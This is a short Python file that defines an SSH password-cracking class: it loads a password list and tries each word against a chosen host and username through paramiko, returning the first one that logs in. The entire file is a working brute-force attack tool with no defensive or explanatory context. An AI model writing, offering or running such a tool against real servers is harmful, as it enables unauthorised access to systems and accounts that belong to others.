import paramiko
import getpass
import os

class SSH:
    def __init__(self, pl, ip='127.0.0.1', port=22, username=getpass.getuser(), **kwargs):
        self.ip = ip
        self.port = port
        self.username = username
        self.pl = open(pl, 'r').read()

    def crack(self):
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        for i in self.pl.split():
            try:
                s.connect(self.ip, self.port, self.username, i)
                return i
            except:
                pass
        s.close()